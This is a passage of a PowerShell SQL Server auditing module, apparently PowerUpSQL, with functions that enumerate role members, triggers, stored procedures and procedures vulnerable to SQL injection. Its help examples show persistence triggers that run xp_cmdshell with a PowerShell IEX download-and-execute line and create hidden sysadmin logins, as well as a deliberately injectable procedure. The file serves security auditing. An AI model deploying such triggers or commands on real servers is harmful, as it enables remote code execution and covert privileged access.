        if ($RolePrincipalName)
        {
            $RolePrincipalNameFilter = " AND USER_NAME(role_principal_id) like '$RolePrincipalName'"
        }
        else
        {
            $RolePrincipalNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin or DBO privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get list of databases
        if($NoDefaults)
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -NoDefaults -SuppressVerbose
        }
        else
        {
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose
        }

        # Get roles for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Getting role members for the $DbName database..."
            }

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                role_principal_id as [RolePrincipalId],
                USER_NAME(role_principal_id) as [RolePrincipalName],
                member_principal_id as [PrincipalId],
                USER_NAME(member_principal_id) as [PrincipalName]
                FROM [$DbName].[sys].[database_role_members]
                WHERE 1=1
                $RolePrincipalNameFilter
            $PrincipalNameFilter"

            # Execute Query
            $TblDatabaseRoleMembersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblDatabaseRoleMembers = $TblDatabaseRoleMembers + $TblDatabaseRoleMembersTemp
        }
    }

    End
    {
        # Return data
        $TblDatabaseRoleMembers
    }
}


# ----------------------------------
#  Get-SQLTriggerDdl
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLTriggerDdl
{
    <#
            .SYNOPSIS
            Returns DDL trigger information from target SQL Servers. This includes logon triggers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER TriggerName
            Trigger name to filter for.
            .EXAMPLE
            PS C:\> Get-SQLTriggerDdl -Instance SQLServer1\STANDARDDEV2014

            ComputerName      : SQLServer1
            Instance          : SQLServer1\STANDARDDEV2014
            TriggerName       : persistence_ddl_1
            TriggerId         : 1104722988
            TriggerType       : SERVER
            ObjectType        : SQL_TRIGGER
            ObjectClass       : SERVER
            TriggerDefinition : -- Create the DDL trigger
            CREATE Trigger [persistence_ddl_1]
            ON ALL Server
            FOR DDL_LOGIN_EVENTS
            AS

            -- Download and run a PowerShell script from the internet
            EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object
            net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_ddl.ps1'')"';

            -- Add a sysadmin named 'SysAdmin_DDL' if it doesn't exist
            if (SELECT count(name) FROM sys.sql_logins WHERE name like 'SysAdmin_DDL') = 0

            -- Create a login
            CREATE LOGIN SysAdmin_DDL WITH PASSWORD = 'Password123!';

            -- Add the login to the sysadmin fixed server role
            EXEC sp_addsrvrolemember 'SysAdmin_DDL', 'sysadmin';

            create_date       : 4/26/2016 8:34:49 PM
            modify_date       : 4/26/2016 8:34:49 PM
            is_ms_shipped     : False
            is_disabled       : False
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLTriggerDdl -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Trigger name.')]
        [string]$TriggerName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblDdlTriggers = New-Object -TypeName System.Data.DataTable

        # Setup role name
        if ($TriggerName)
        {
            $TriggerNameFilter = " AND name like '$TriggerName'"
        }
        else
        {
            $TriggerNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to get all rows.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = " SELECT 	'$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            name as [TriggerName],
            object_id as [TriggerId],
            [TriggerType] = 'SERVER',
            type_desc as [ObjectType],
            parent_class_desc as [ObjectClass],
            OBJECT_DEFINITION(OBJECT_ID) as [TriggerDefinition],
            create_date,
            modify_date,
            is_ms_shipped,
            is_disabled
            FROM [master].[sys].[server_triggers] WHERE 1=1
        $TriggerNameFilter"

        # Execute Query
        $TblDdlTriggersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results
        $TblDdlTriggers = $TblDdlTriggers  + $TblDdlTriggersTemp
    }

    End
    {
        # Return data
        $TblDdlTriggers
    }
}


# ----------------------------------
#  Get-SQLTriggerDml
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLTriggerDml
{
    <#
            .SYNOPSIS
            Returns DML trigger information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER TriggerName
            Trigger name to filter for.
            .EXAMPLE
            PS C:\> Get-SQLTriggerDml -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb

            ComputerName           : SQLServer1
            Instance               : SQLServer1\STANDARDDEV2014
            DatabaseName           : testdb
            TriggerName            : persistence_dml_1
            TriggerId              : 565577053
            TriggerType            : DATABASE
            ObjectType             : SQL_TRIGGER
            ObjectClass            : OBJECT_OR_COLUMN
            TriggerDefinition      : -- Create trigger
            CREATE TRIGGER [persistence_dml_1]
            ON testdb.dbo.NOCList
            FOR INSERT, UPDATE, DELETE AS

            -- Impersonate sa
            EXECUTE AS LOGIN = 'sa'

            -- Download a PowerShell script from the internet to memory and execute it
            EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object
            net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_dml.ps1'')"';

            -- Add a sysadmin named 'SysAdmin_DML' if it doesn't exist
            if (select count(*) from sys.sql_logins where name like 'SysAdmin_DML') = 0

            -- Create a login
            CREATE LOGIN SysAdmin_DML WITH PASSWORD = 'Password123!';

            -- Add the login to the sysadmin fixed server role
            EXEC sp_addsrvrolemember 'SysAdmin_DML', 'sysadmin';

            create_date            : 4/26/2016 8:58:28 PM
            modify_date            : 4/26/2016 8:58:28 PM
            is_ms_shipped          : False
            is_disabled            : False
            is_not_for_replication : False
            is_instead_of_trigger  : False
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLTriggerDml -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Trigger name.')]
        [string]$TriggerName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblDmlTriggers = New-Object -TypeName System.Data.DataTable

        # Setup login filter
        if ($TriggerName)
        {
            $TriggerNameFilter = " AND name like '$TriggerName'"
        }
        else
        {
            $TriggerNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to get all rows.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing DML triggers from the databases below:."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Get list of databases
        $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -HasAccess -DatabaseName $DatabaseName -SuppressVerbose

        # Get role for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - $DbName"
            }

            # Define Query
            $Query = "  use [$DbName];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$DbName' as [DatabaseName],
                name as [TriggerName],
                object_id as [TriggerId],
                [TriggerType] = 'DATABASE',
                type_desc as [ObjectType],
                parent_class_desc as [ObjectClass],
                OBJECT_DEFINITION(OBJECT_ID) as [TriggerDefinition],
                create_date,
                modify_date,
                is_ms_shipped,
                is_disabled,
                is_not_for_replication,
                is_instead_of_trigger
                FROM [$DbName].[sys].[triggers] WHERE 1=1
                $TriggerNameFilter"

            # Execute Query
            $TblDmlTriggersTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblDmlTriggers = $TblDmlTriggers + $TblDmlTriggersTemp
        }
    }

    End
    {
        # Return data
        $TblDmlTriggers
    }
}


# ----------------------------------
#  Get-SQLStoredProcedure
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLStoredProcedure
{
    <#
            .SYNOPSIS
            Returns stored procedures from target SQL Servers.
            Note: Viewing procedure definitions requires the sysadmin role or the VIEW DEFINITION permission.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER ProcedureName
            Procedure name to filter for.
            .PARAMETER Keyword
            Filter for procedures that include the keyword.
            .PARAMETER AutoExec
            Only select procedures that execute when the SQL Server service starts.
            .PARAMETER NoDefaults
            Filter out results from default databases.
            .EXAMPLE
            PS C:\> Get-SQLStoredProcedure -Instance SQLServer1\STANDARDDEV2014 -NoDefaults -DatabaseName testdb

            ComputerName        : SQLServer1
            Instance            : SQLServer1\STANDARDDEV2014
            DatabaseName        : testdb
            SchemaName          : dbo
            ProcedureName       : MyTestProc
            ProcedureType       : PROCEDURE
            ProcedureDefinition : CREATE PROC MyTestProc
                                  WITH EXECUTE AS OWNER
                                  as
                                  begin
                                  select SYSTEM_USER as currentlogin, ORIGINAL_LOGIN() as originallogin
                                  end
            SQL_DATA_ACCESS     : MODIFIES
            ROUTINE_BODY        : SQL
            CREATED             : 7/24/2016 3:16:29 PM
            LAST_ALTERED        : 7/24/2016 3:16:29 PM
            is_ms_shipped       : False
            is_auto_executed    : False

            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcedure -Verbose -NoDefaults
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$Keyword,

        [Parameter(Mandatory = $false,
        HelpMessage = "Only include procedures configured to execute when SQL Server service starts.")]
        [switch]$AutoExec,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblProcs = New-Object -TypeName System.Data.DataTable

        # Setup routine name filter
        if ($ProcedureName)
        {
            $ProcedureNameFilter = " AND ROUTINE_NAME like '$ProcedureName'"
        }
        else
        {
            $ProcedureNameFilter = ''
        }

        # Setup ROUTINE_DEFINITION filter
        if ($Keyword)
        {
            $KeywordFilter = " AND ROUTINE_DEFINITION like '%$Keyword%'"
        }
        else
        {
            $KeywordFilter = ''
        }

        # Setup AutoExec filter
        if ($AutoExec)
        {
            $AutoExecFilter = " AND is_auto_executed = 1"
        }
        else
        {
            $AutoExecFilter = ''
        }
    }

    Process
    {
        # Parse ComputerName
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing stored procedures from databases below:"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get role for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - $DbName"
            }

            # Define Query
            $Query = "  use [$DbName];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                ROUTINE_CATALOG AS [DatabaseName],
                ROUTINE_SCHEMA AS [SchemaName],
                ROUTINE_NAME as [ProcedureName],
                ROUTINE_TYPE as [ProcedureType],
                ROUTINE_DEFINITION as [ProcedureDefinition],
                SQL_DATA_ACCESS,
                ROUTINE_BODY,
                CREATED,
                LAST_ALTERED,
                b.is_ms_shipped,
                b.is_auto_executed
                FROM [INFORMATION_SCHEMA].[ROUTINES] a
                JOIN [sys].[procedures]  b
                ON a.ROUTINE_NAME = b.name
                WHERE 1=1
                $AutoExecFilter
                $ProcedureNameFilter
                $KeywordFilter"

            # Execute Query
            $TblProcsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblProcs = $TblProcs + $TblProcsTemp
        }
    }

    End
    {
        # Return data
        $TblProcs
    }
}


# ----------------------------------
#  Get-SQLStoredProcedureSQLi
# ----------------------------------
# Author: Scott Sutherland
# Todo: Add column Procedure_Owner_Name
# Todo: Add column owner Owner_Is_Sysadmin
# Todo: Add is_ms_shipped and is_auto_executed to signed proc query
Function  Get-SQLStoredProcedureSQLi
{
    <#
            .SYNOPSIS
            Returns stored procedures containing dynamic SQL and concatenations that may suffer from SQL injection on target SQL Servers.
            Note: Viewing procedure definitions requires the sysadmin role or the VIEW DEFINITION permission.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER ProcedureName
            Procedure name to filter for.
            .PARAMETER Keyword
            Filter for procedures that include the keyword.
            .PARAMETER OnlySigned
            Filter for signed procedures.
            .PARAMETER AutoExec
            Only select procedures that execute when the SQL Server service starts.
            .PARAMETER NoDefaults
            Filter out results from default databases.
            .EXAMPLE
            PS C:\> Get-SQLStoredProcedureSqli -Instance SQLServer1\STANDARDDEV2014 -NoDefaults -DatabaseName testdb

            ComputerName        : SQLServer1
            Instance            : SQLServer1\STANDARDDEV2014
            DatabaseName        : testdb
            SchemaName          : dbo
            ProcedureName       : sp_sqli
            ProcedureType       : PROCEDURE
            ProcedureDefinition : -- Create procedure
                                CREATE PROCEDURE sp_sqli
                                @DbName varchar(max)
                                WITH EXECUTE AS OWNER
                                AS
                                BEGIN
                                Declare @query as varchar(max)
                                SET @query = 'SELECT name FROM master..sysdatabases where name like ''%'+ @DbName+'%'' OR name=''tempdb''';
                                EXECUTE(@query)
                                END
                                GO
            SQL_DATA_ACCESS     : MODIFIES
            ROUTINE_BODY        : SQL
            CREATED             : 7/24/2016 3:16:29 PM
            LAST_ALTERED        : 7/24/2016 3:16:29 PM
            is_ms_shipped       : False
            is_auto_executed    : False

            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcedureSqli -Verbose -NoDefaults
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$Keyword,
        
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for signed procedures.')]
        [switch]$OnlySigned,

        [Parameter(Mandatory = $false,
        HelpMessage = "Only include procedures configured to execute when SQL Server service starts.")]
        [switch]$AutoExec,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblProcs = New-Object -TypeName System.Data.DataTable

        # Setup routine name filter
        if ($ProcedureName)
        {
            $ProcedureNameFilter = " AND ROUTINE_NAME like '$ProcedureName'"
        }
        else
        {
            $ProcedureNameFilter = ''
        }

        # Setup ROUTINE_DEFINITION filter
        if ($Keyword)
        {
            $KeywordFilter = " AND ROUTINE_DEFINITION like '%$Keyword%'"
        }
        else
        {
            $KeywordFilter = ''
        }

        # Setup AutoExec filter
        if ($AutoExec)
        {
            $AutoExecFilter = " AND is_auto_executed = 1"
        }
        else
        {
            $AutoExecFilter = ''
        }
    }

    Process
    {
        # Parse ComputerName
        If ($Instance)
        {
            $ComputerName = $Instance.split('\')[0].split(',')[0]
            $Instance = $Instance
        }
        else
        {
            $ComputerName = $env:COMPUTERNAME
            $Instance = '.\'
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Checking databases below for vulnerable stored procedures:"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get role for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {

                Write-Verbose -Message "$Instance : - Checking $DbName database..."

            }

            # Define Query
            $Query = "  use [$DbName];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                ROUTINE_CATALOG AS [DatabaseName],
                ROUTINE_SCHEMA AS [SchemaName],
                ROUTINE_NAME as [ProcedureName],
                ROUTINE_TYPE as [ProcedureType],
                ROUTINE_DEFINITION as [ProcedureDefinition],
                SQL_DATA_ACCESS,
                ROUTINE_BODY,
                CREATED,
                LAST_ALTERED,
                b.is_ms_shipped,
                b.is_auto_executed
                FROM [INFORMATION_SCHEMA].[ROUTINES] a
                JOIN [sys].[procedures]  b
                ON a.ROUTINE_NAME = b.name
                WHERE 1=1 AND               
                (ROUTINE_DEFINITION like '%sp_executesql%' OR
                ROUTINE_DEFINITION like '%sp_sqlexec%' OR
                ROUTINE_DEFINITION like '%exec @%' OR
                ROUTINE_DEFINITION like '%execute @%' OR
                ROUTINE_DEFINITION like '%exec (%' OR
                ROUTINE_DEFINITION like '%exec(%' OR
                ROUTINE_DEFINITION like '%execute (%' OR
                ROUTINE_DEFINITION like '%execute(%' OR
                ROUTINE_DEFINITION like '%''''''+%' OR
                ROUTINE_DEFINITION like '%'''''' +%') 
                AND ROUTINE_DEFINITION like '%+%'
                AND ROUTINE_CATALOG not like 'msdb' 
                $AutoExecFilter                              
                $ProcedureNameFilter
                $KeywordFilter
                ORDER BY ROUTINE_NAME"

            # Define query for signed procedures
            if($OnlySigned){
                $Query = "  use [$DbName];
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                spr.ROUTINE_CATALOG as DB_NAME,
                spr.SPECIFIC_SCHEMA as SCHEMA_NAME,
                spr.ROUTINE_NAME as SP_NAME,
                spr.ROUTINE_DEFINITION as SP_CODE,
                CASE cp.crypt_type
                when 'SPVC' then cer.name
                when 'CPVC' then Cer.name
                when 'SPVA' then ak.name
                when 'CPVA' then ak.name
                END as CERT_NAME,
                sp.name as CERT_LOGIN,
                sp.sid as CERT_SID
                FROM sys.crypt_properties cp
                JOIN sys.objects o ON cp.major_id = o.object_id
                LEFT JOIN sys.certificates cer ON cp.thumbprint = cer.thumbprint
                LEFT JOIN sys.asymmetric_keys ak ON cp.thumbprint = ak.thumbprint
                LEFT JOIN INFORMATION_SCHEMA.ROUTINES spr on spr.ROUTINE_NAME = o.name
                LEFT JOIN sys.server_principals sp on sp.sid = cer.sid
                WHERE o.type_desc = 'SQL_STORED_PROCEDURE'AND
                (ROUTINE_DEFINITION like '%sp_executesql%' OR
                ROUTINE_DEFINITION like '%sp_sqlexec%' OR
                ROUTINE_DEFINITION like '%exec @%' OR
                ROUTINE_DEFINITION like '%exec (%' OR
                ROUTINE_DEFINITION like '%exec(%' OR
                ROUTINE_DEFINITION like '%execute @%' OR
                ROUTINE_DEFINITION like '%execute (%' OR
                ROUTINE_DEFINITION like '%execute(%' OR
                ROUTINE_DEFINITION like '%''''''+%' OR
                ROUTINE_DEFINITION like '%'''''' +%') AND
                ROUTINE_CATALOG not like 'msdb' AND 
                ROUTINE_DEFINITION like '%+%'"
            }

            # Execute Query
            $TblProcsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Count results
            $TblProcsCount = $TblProcsTemp.rows.count
            Write-Verbose "$Instance : - $TblProcsCount found in $DbName database"

            # Append results
            $TblProcs = $TblProcs + $TblProcsTemp
        }
    }

    End
    {
        # Return data
        $TblProcs
    }
}

# ----------------------------------
#  Get-SQLStoredProcedureAutoExec
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLStoredProcedureAutoExec
{
    <#
            .SYNOPSIS
            Returns stored procedures from target SQL Servers.
            Note: Viewing procedure definitions requires the sysadmin role or the VIEW DEFINITION permission.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER ProcedureName
            Procedure name to filter for.
            .PARAMETER Keyword
            Filter for procedures that include the keyword.
            .EXAMPLE
            PS C:\> Get-SQLStoredProcedureAutoExec -Instance SQLServer1\STANDARDDEV2014 -NoDefaults -DatabaseName testdb

            ComputerName        : SQLServer1
            Instance            : SQLServer1\STANDARDDEV2014
            DatabaseName        : testdb
            SchemaName          : dbo
            ProcedureName       : MyTestProc
            ProcedureType       : PROCEDURE
            ProcedureDefinition : CREATE PROC MyTestProc
                                  WITH EXECUTE AS OWNER
                                  as
                                  begin
                                  select SYSTEM_USER as currentlogin, ORIGINAL_LOGIN() as originallogin
                                  end
            SQL_DATA_ACCESS     : MODIFIES
            ROUTINE_BODY        : SQL
            CREATED             : 7/24/2016 3:16:29 PM
            LAST_ALTERED        : 7/24/2016 3:16:29 PM
            is_ms_shipped       : False
            is_auto_executed    : TRUE

            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcedureAutoExec -Verbose -NoDefaults
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for procedures that include the keyword.')]
        [string]$Keyword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblProcs = New-Object -TypeName System.Data.DataTable

        # Setup routine name filter
        if ($ProcedureName)
        {
